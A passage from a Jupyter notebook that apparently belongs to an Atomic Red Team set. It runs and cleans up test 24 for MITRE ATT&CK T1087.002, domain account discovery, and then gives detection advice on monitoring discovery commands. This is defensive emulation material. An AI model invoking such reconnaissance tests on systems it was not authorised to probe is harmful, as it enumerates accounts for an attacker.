   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 24"
  },
  {
   "cell_type": "markdown",
   "id": "6db59de7",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/T1087/ 2>/dev/null \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "153c7824",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 24 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a0c55259",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}